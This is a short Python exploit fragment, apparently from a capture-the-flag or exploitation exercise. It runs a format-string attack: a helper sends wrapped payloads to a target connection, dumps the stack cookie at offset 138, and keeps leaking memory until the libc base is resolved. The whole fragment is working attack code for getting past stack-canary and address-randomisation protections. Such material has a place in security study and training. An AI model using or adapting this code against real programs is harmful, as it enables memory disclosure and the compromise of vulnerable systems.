...
def do_fmt(payload):
	"""
		Works if your're in the right spot
	"""
	conn.sendline( "-->" + payload + "<--")
	conn.recvuntil("-->")
	leaks = conn.recvuntil("<--")[:-3] # remove the arrow
	return leaks



fmt = FormatStringLeaker(format_func=do_fmt, libc=libc, binary=binary, bits=64, bad_offsets=[138])
# get the cookie
cookie = fmt.dump_offset(138)

# keep searching till you find libc
while not fmt.libc_fixed:
	fmt.leak_more(10)
